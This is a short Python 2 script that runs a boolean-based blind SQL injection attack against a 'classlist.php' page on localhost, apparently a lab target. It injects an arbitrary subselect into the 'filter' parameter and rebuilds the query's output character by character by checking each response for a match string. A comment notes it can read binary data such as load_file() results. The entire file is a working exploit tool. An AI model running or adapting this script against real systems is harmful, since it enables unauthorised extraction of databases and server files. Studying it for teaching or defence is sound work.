import sys
import requests
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-m', '--match', required=True,
                    help='String to match of the website when the query is TRUE', dest='match')
parser.add_argument('-s', '--sql', required=True, nargs="+",
                    help='Subselect to run on the database.  Must return a string (use concat and group_concat)', dest='sql')
parser.add_argument('-v','--verbose',action='store_true',help='Be Verbose in the output')

args = parser.parse_args()
sqlstatement = " ".join(args.sql)

def checkurl(url, matchstring):
    content = requests.get(url).content
    return matchstring in content

charset = ' \!"#$%&\'(),-./0123456789:;<=>?@[\\]^_`abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~\r\n\t'
#Note:When the field is binary (such as results of load_file() lower doesn't work so we still have the uppers in the chars we try.
chartotry = 1
done = False
data = ""
while not done:
    foundmatch = False
    for letter in charset:
        url2test = "http://127.0.0.1/classlist.php?filter=504'+and+(ord(mid((" + sqlstatement + ")," + str(chartotry) + ",1))=" + str(ord(letter)) + ");--+#"
        foundmatch = checkurl(url2test, args.match) 
        if foundmatch:
            data += letter
            if args.verbose: 
                print data
            chartotry = chartotry + 1
            break   #Break out of FOR loop and restart it
    #Reaching here we either found a match or tried every character.  Check foundmatch to know which.
    if not foundmatch:
        #no matching characters. Time to quit, but check to see if there was more data
        checknull = "http://127.0.0.1/classlist.php?filter=504'+and+(ord(lower(mid((" + sqlstatement + ")," + str(chartotry) + ",1)))=0);--+#"
        if not checkurl(checknull, args.match):
            #We tried every character and didn't find a match or the end of the data (null byte).
            print "We tried every possible character and didn't reach the end of the string.  You should try adding more characters to charset."
            if raw_input("Do you want to skip this character and continue?").lower()[0]=="y":
               chartotry = chartotry+1
               continue # restart while loop
        done=True

        
print data
